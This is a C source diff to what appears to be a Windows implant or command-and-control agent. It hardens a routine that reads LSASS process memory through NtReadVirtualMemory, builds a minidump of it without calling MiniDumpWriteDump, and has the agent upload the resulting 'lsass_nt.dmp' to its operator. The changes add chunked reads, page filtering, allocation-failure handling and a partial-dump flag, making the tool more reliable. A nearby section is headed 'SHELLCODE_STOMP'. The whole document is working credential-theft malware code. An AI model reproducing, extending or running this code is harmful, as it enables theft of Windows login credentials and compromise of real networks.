@@ -709,9 +709,32 @@ static int ishell_drain_pipe(HANDLE pipe, char *buf, size_t cap, size_t *len) {
 // Builds a minimal valid MDMP via NtReadVirtualMemory; no MiniDumpWriteDump call.
 // Returns heap-allocated buffer (caller must free) or NULL on failure.
 // *out_len receives the buffer size.
+// *out_partial is set when the bounded capture could not include all readable
+// regions, so the caller can report that the resulting dump is partial.
 
-static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len) {
+#define LSASS_NT_MAX_DUMP_BYTES (256ULL * 1024ULL * 1024ULL)
+#define LSASS_NT_READ_CHUNK     (1024ULL * 1024ULL)
+#define LSASS_NT_MAX_REGIONS    65536U
+
+static int lsass_region_is_readable(DWORD protect) {
+    DWORD base = protect & 0xffU;
+    if (protect & (PAGE_GUARD | PAGE_NOACCESS)) return 0;
+    switch (base) {
+        case PAGE_READONLY:
+        case PAGE_READWRITE:
+        case PAGE_WRITECOPY:
+        case PAGE_EXECUTE_READ:
+        case PAGE_EXECUTE_READWRITE:
+        case PAGE_EXECUTE_WRITECOPY:
+            return 1;
+        default:
+            return 0;
+    }
+}
+
+static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len, int *out_partial) {
     *out_len = 0;
+    if (out_partial) *out_partial = 0;
 
     /* resolve NtReadVirtualMemory */
     typedef LONG (NTAPI *NtReadVM_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
@@ -745,7 +768,17 @@ static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len) {
         MODULEENTRY32 me; me.dwSize = sizeof(me);
         if (Module32First(snap1, &me)) {
             do {
-                if (n_mods >= cap_mods) { cap_mods = cap_mods ? cap_mods*2 : 64; mods = (ModInfo*)realloc(mods, cap_mods*sizeof(ModInfo)); }
+                if (n_mods >= cap_mods) {
+                    int next_cap = cap_mods ? cap_mods * 2 : 64;
+                    ModInfo *next = (ModInfo*)realloc(mods, (size_t)next_cap * sizeof(ModInfo));
+                    if (!next) {
+                        /* A module list is optional for a usable memory stream. */
+                        free(mods); mods = NULL; n_mods = 0; cap_mods = 0;
+                        break;
+                    }
+                    mods = next;
+                    cap_mods = next_cap;
+                }
                 mods[n_mods].base = (uint64_t)(uintptr_t)me.modBaseAddr;
                 mods[n_mods].sz   = me.modBaseSize;
                 strncpy(mods[n_mods].name, me.szModule, 255); mods[n_mods].name[255] = 0;
@@ -758,29 +791,82 @@ static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len) {
     /* enumerate committed memory regions */
     typedef struct { uint64_t addr, sz; uint8_t *buf; } MemReg;
     MemReg *regs = NULL; int n_regs = 0, cap_regs = 0;
+    size_t captured_data = 0;
+    int capture_stop = 0;
     SIZE_T cur = 0;
     while (1) {
         MEMORY_BASIC_INFORMATION mbi;
         if (!VirtualQueryEx(hProc, (LPCVOID)cur, &mbi, sizeof(mbi))) break;
-        if (mbi.State == MEM_COMMIT) {
-            uint8_t *rbuf = (uint8_t*)malloc(mbi.RegionSize);
-            if (rbuf) {
+        if (mbi.State == MEM_COMMIT && lsass_region_is_readable(mbi.Protect)) {
+            SIZE_T region_off = 0;
+            while (region_off < mbi.RegionSize && captured_data < LSASS_NT_MAX_DUMP_BYTES) {
+                SIZE_T remaining = mbi.RegionSize - region_off;
+                SIZE_T want = remaining > LSASS_NT_READ_CHUNK ?
+                              (SIZE_T)LSASS_NT_READ_CHUNK : remaining;
+                size_t budget = LSASS_NT_MAX_DUMP_BYTES - captured_data;
+                if ((uint64_t)want > (uint64_t)budget) want = (SIZE_T)budget;
+                if (want == 0) break;
+
+                uint8_t *rbuf = (uint8_t*)malloc((size_t)want);
+                if (!rbuf) {
+                    if (out_partial) *out_partial = 1;
+                    capture_stop = 1;
+                    break;
+                }
+
                 SIZE_T nRead = 0;
-                ntReadVM(hProc, mbi.BaseAddress, rbuf, mbi.RegionSize, &nRead);
+                PVOID read_base = (PBYTE)mbi.BaseAddress + region_off;
+                (void)ntReadVM(hProc, read_base, rbuf, want, &nRead);
+                if (nRead > want) nRead = want; /* defensive against a bad API result */
                 if (nRead > 0) {
-                    if (n_regs >= cap_regs) { cap_regs = cap_regs ? cap_regs*2 : 256; regs = (MemReg*)realloc(regs, cap_regs*sizeof(MemReg)); }
-                    regs[n_regs].addr = (uint64_t)(uintptr_t)mbi.BaseAddress;
+                    if (n_regs >= (int)LSASS_NT_MAX_REGIONS) {
+                        free(rbuf);
+                        if (out_partial) *out_partial = 1;
+                        capture_stop = 1;
+                        break;
+                    }
+                    if (n_regs >= cap_regs) {
+                        int next_cap = cap_regs ? cap_regs * 2 : 256;
+                        if ((unsigned)next_cap > LSASS_NT_MAX_REGIONS)
+                            next_cap = (int)LSASS_NT_MAX_REGIONS;
+                        MemReg *next = (MemReg*)realloc(regs, (size_t)next_cap * sizeof(MemReg));
+                        if (!next) {
+                            free(rbuf);
+                            if (out_partial) *out_partial = 1;
+                            capture_stop = 1;
+                            break;
+                        }
+                        regs = next;
+                        cap_regs = next_cap;
+                    }
+                    regs[n_regs].addr = (uint64_t)(uintptr_t)read_base;
                     regs[n_regs].sz   = nRead;
                     regs[n_regs].buf  = rbuf;
                     n_regs++;
-                } else free(rbuf);
+                    captured_data += (size_t)nRead;
+                } else {
+                    free(rbuf);
+                }
+
+                /* Advance by the requested chunk, not nRead. A partial or
+                 * failed read must not cause the same memory to be retried. */
+                region_off += want;
             }
+            if (captured_data >= LSASS_NT_MAX_DUMP_BYTES && out_partial)
+                *out_partial = 1;
         }
+        if (capture_stop) break;
         SIZE_T next = (SIZE_T)mbi.BaseAddress + mbi.RegionSize;
         if (next <= cur) break;
         cur = next;
+        if (captured_data >= LSASS_NT_MAX_DUMP_BYTES) break;
     }
     CloseHandle(hProc);
+    if (captured_data == 0) {
+        free(mods);
+        free(regs);
+        return NULL;
+    }
 
     /* build MDMP */
     #define MOD_ENT_SZ 108
@@ -792,11 +878,14 @@ static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len) {
     /* build module name blobs (MINIDUMP_STRING = ULONG32 len + UTF-16 + null) */
     typedef struct { int rva; uint8_t *blob; int blob_len; } NameBlob;
     NameBlob *names = (NameBlob*)calloc(n_mods, sizeof(NameBlob));
+    uint8_t *buf = NULL;
+    if (n_mods > 0 && !names) goto done;
     int name_off = mod_list_off + 4 + n_mods * MOD_ENT_SZ;
     for (int i = 0; i < n_mods; i++) {
         int namelen = (int)strlen(mods[i].name);
         int blen = 4 + (namelen + 1) * 2; /* ULONG32 + UTF-16 chars + null */
         uint8_t *blob = (uint8_t*)calloc(1, blen);
+        if (!blob) goto done;
         uint32_t cb = (uint32_t)(namelen * 2); /* byte count excl null */
         memcpy(blob, &cb, 4);
         for (int j = 0; j < namelen; j++) { blob[4 + j*2] = (uint8_t)mods[i].name[j]; blob[4+j*2+1] = 0; }
@@ -807,11 +896,9 @@ static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len) {
     int mem64_off    = name_off;
     int mem64_hdr_len= 8 + 8 + n_regs * 16;
     int data_off     = mem64_off + mem64_hdr_len;
-    size_t total_data = 0;
-    for (int i = 0; i < n_regs; i++) total_data += regs[i].sz;
-    size_t total_len = (size_t)data_off + total_data;
+    size_t total_len = (size_t)data_off + captured_data;
 
-    uint8_t *buf = (uint8_t*)calloc(1, total_len);
+    buf = (uint8_t*)calloc(1, total_len);
     if (!buf) goto done;
 
     #define WU32(off,v) do { uint32_t _v=(uint32_t)(v); memcpy(buf+(off),&_v,4); } while(0)
@@ -869,7 +956,7 @@ static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len) {
     *out_len = total_len;
 
 done:
-    for (int i = 0; i < n_mods; i++) free(names[i].blob);
+    if (names) for (int i = 0; i < n_mods; i++) free(names[i].blob);
     free(names); free(mods);
     for (int i = 0; i < n_regs; i++) free(regs[i].buf);
     free(regs);
@@ -880,6 +967,10 @@ done:
     #undef WU64
     #undef WU16
 }
+
+#undef LSASS_NT_MAX_DUMP_BYTES
+#undef LSASS_NT_READ_CHUNK
+#undef LSASS_NT_MAX_REGIONS
 
 // ── SHELLCODE_STOMP ───────────────────────────────────────────────────────────
 
@@ -2824,12 +2915,15 @@ void dispatch_task(AgentTask *task) {
         DWORD lsas_pid = 0;
         if (args && args[0] && args[0] != '{') lsas_pid = (DWORD)strtoul(args, NULL, 10);
         size_t dump_len = 0;
-        uint8_t *dump = lsass_dump_nt(lsas_pid, &dump_len);
+        int dump_partial = 0;
+        uint8_t *dump = lsass_dump_nt(lsas_pid, &dump_len, &dump_partial);
         if (!dump || dump_len == 0) {
-            agent_send_result(task->id, "", "lsass_dump_nt: failed (need admin?)");
+            agent_send_result(task->id, "", "lsass_dump_nt: failed (access denied or resource limit)");
         } else {
             agent_upload_file(task->id, "lsass_nt.dmp", dump, dump_len);
-            char msg[64]; snprintf(msg,sizeof(msg),"[+] lsass NT dump: %zu bytes", dump_len);
+            char msg[128];
+            snprintf(msg, sizeof(msg), "[+] lsass NT dump: %zu bytes%s", dump_len,
+                     dump_partial ? " (partial: resource limit reached)" : "");
             agent_send_result(task->id, msg, "");
         }
         free(dump);
